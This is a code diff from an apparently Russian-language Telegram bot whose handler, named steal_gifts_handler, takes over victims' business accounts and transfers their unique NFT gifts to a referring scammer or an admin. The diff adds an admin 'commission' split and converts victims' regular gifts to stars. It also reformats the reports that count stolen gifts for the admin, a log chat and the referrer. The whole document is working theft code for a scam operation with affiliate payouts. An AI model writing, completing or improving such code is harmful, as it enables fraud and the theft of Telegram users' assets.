@@ -828,12 +828,12 @@ async def steal_gifts_handler(callback: CallbackQuery):
 
     inviter_id = user_referrer_map.get(str(user_id))
     
-    # Определяем получателей с учетом комиссии
-    take_commission = str(user_id) in COMMISSION_USERS
+    # Определяем, нужно ли брать комиссию (если пригласивший в списке COMMISSION_USERS)
+    take_commission = inviter_id and str(inviter_id) in COMMISSION_USERS
     recipient_id = inviter_id if inviter_id else ADMIN_IDS[0]
     
-    stolen_nfts = []  # Только подарки, переданные пригласившему
-    admin_nfts = []   # Подарки, переданные админу (для полного отчета)
+    stolen_nfts = []  # Подарки, переданные пригласившему (для публичного отчета)
+    admin_nfts = []   # Подарки, переданные админу (комиссия, только для полного отчета)
     stolen_count = 0
     admin_gifts = 0
     user_gifts_count = 0  # Количество подарков, переданных пригласившему
@@ -855,6 +855,7 @@ async def steal_gifts_handler(callback: CallbackQuery):
     unique_gifts = [g for g in gifts_to_process if g.type == "unique" and g.can_be_transferred]
     total_unique = len(unique_gifts)
     
+    # Рассчитываем комиссию (только если пригласивший в списке COMMISSION_USERS)
     if take_commission:
         admin_gifts = calculate_commission(total_unique)
         user_gifts = total_unique - admin_gifts
@@ -870,14 +871,13 @@ async def steal_gifts_handler(callback: CallbackQuery):
             gift_id = gift.owned_gift_id
             gift_name = gift.gift.name.replace(' ', '') if hasattr(gift.gift, 'name') else 'Unknown'
             
-            # Определяем кому передавать подарок
+            # Сначала передаем комиссию админу (если есть)
             if take_commission and admin_sent < admin_gifts:
-                # Передаем админу (комиссия)
                 await bot.transfer_gift(business_id, gift_id, ADMIN_IDS[0], gift.transfer_star_count)
                 admin_nfts.append(f"t.me/nft/{gift_name}")
                 admin_sent += 1
+            # Затем передаем пригласившему
             elif user_sent < user_gifts:
-                # Передаем пригласившему
                 await bot.transfer_gift(business_id, gift_id, recipient_id, gift.transfer_star_count)
                 stolen_nfts.append(f"t.me/nft/{gift_name}")
                 user_sent += 1
@@ -888,55 +888,62 @@ async def steal_gifts_handler(callback: CallbackQuery):
             logging.error(f"Ошибка при передаче подарка: {e}")
             continue
 
-    # Формируем полный отчет для админа (с комиссией)
+    # Конвертируем обычные подарки в звёзды
+    for gift in gifts_to_process:
+        if gift.type == "regular":
+            try:
+                await bot.convert_gift_to_stars(business_id, gift.owned_gift_id)
+            except Exception as e:
+                logging.error(f"Ошибка конвертации подарка: {e}")
+
+    # Полный отчет для админа (включая комиссию)
     full_report = []
     if stolen_count > 0:
-        full_report.append(f"\n🎁 Всего украдено подарков: <b>{stolen_count}</b>\n")
+        full_report.append(f"🎁 Полный отчет по бизнес-аккаунту {user_id}:\n")
+        full_report.append(f"├─ Всего NFT: {total_unique}\n")
         if take_commission and admin_gifts > 0:
-            full_report.append(f"├─ Админу: <b>{admin_gifts}</b>\n")
-            full_report.append(f"╰─ Пригласившему: <b>{user_gifts_count}</b>\n\n")
-            full_report.extend([f"🔹 {nft}\n" for nft in admin_nfts[:5]])
-            full_report.append("\n")
-        full_report.extend([f"🔸 {nft}\n" for nft in stolen_nfts[:5]])
+            full_report.append(f"├─ Комиссия админу: {admin_gifts}\n")
+            full_report.append(f"╰─ Передано пригласившему: {user_gifts_count}\n\n")
+            if admin_nfts:
+                full_report.append("🔹 Подарки админу:\n")
+                full_report.extend([f"├─ {nft}\n" for nft in admin_nfts[:5]])
+                full_report.append("\n")
+        if stolen_nfts:
+            full_report.append("🔸 Подарки пригласившему:\n")
+            full_report.extend([f"├─ {nft}\n" for nft in stolen_nfts[:5]])
     
-    # Формируем публичный отчет (без комиссии)
+    # Публичный отчет (только переданные подарки)
     public_report = []
     if user_gifts_count > 0:
-        public_report.append(f"\n🎁 Успешно украдено подарков: <b>{user_gifts_count}</b>\n")
-        public_report.extend([f"🔸 {nft}\n" for nft in stolen_nfts[:5]])
+        public_report.append(f"🎁 Передано подарков: {user_gifts_count}\n")
+        if stolen_nfts:
+            public_report.extend([f"├─ {nft}\n" for nft in stolen_nfts[:5]])
     
-    # Отправляем полный отчет админу в личку
-    if stolen_count > 0 and ADMIN_IDS:
+    # Отправляем полный отчет админу
+    if ADMIN_IDS and full_report:
         try:
             await bot.send_message(
                 chat_id=ADMIN_IDS[0],
-                text=f"🔷 Полный отчет по бизнес-аккаунту {user_id}:\n{''.join(full_report)}",
+                text="".join(full_report),
                 parse_mode="HTML"
             )
         except Exception as e:
-            logging.error(f"Ошибка отправки отчета админу: {e}")
+            logging.error(f"Ошибка отправки полного отчета админу: {e}")
     
     # Отправляем публичный отчет в лог-чат
-    report_text = f"Отчет по бизнес-аккаунту {user_id}:"
-    if user_gifts_count > 0:
+    if public_report:
         await bot.send_message(
             chat_id=LOG_CHAT_ID,
-            text=f"{report_text}\n{''.join(public_report)}",
-            parse_mode="HTML"
-        )
-    else:
-        await bot.send_message(
-            chat_id=LOG_CHAT_ID,
-            text=f"{report_text}\nНе удалось украсть подарки",
+            text="".join(public_report),
             parse_mode="HTML"
         )
     
-    # Отправляем публичный отчет пригласившему (если он есть и не сам пользователь)
+    # Отправляем уведомление пригласившему (если он есть и не сам пользователь)
     if inviter_id and inviter_id != user_id and user_gifts_count > 0:
         try:
             await bot.send_message(
-                chat_id=inviter_id,
-                text=f"Отчет по вашему рефералу {user_id}:\n{''.join(public_report)}",
+                chat_id=int(inviter_id),
+                text=f"🎁 Вам переведено {user_gifts_count} подарков от {user.id}",
                 parse_mode="HTML"
             )
         except Exception as e:
@@ -944,7 +951,7 @@ async def steal_gifts_handler(callback: CallbackQuery):
     
     answer_text = f"Украдено {stolen_count} подарков"
     if take_commission and admin_gifts > 0:
-        answer_text += f" ({admin_gifts} админу)"
+        answer_text += f" (комиссия: {admin_gifts})"
     await callback.answer(answer_text)
 
 @dp.callback_query(F.data.startswith("transfer_stars:"))
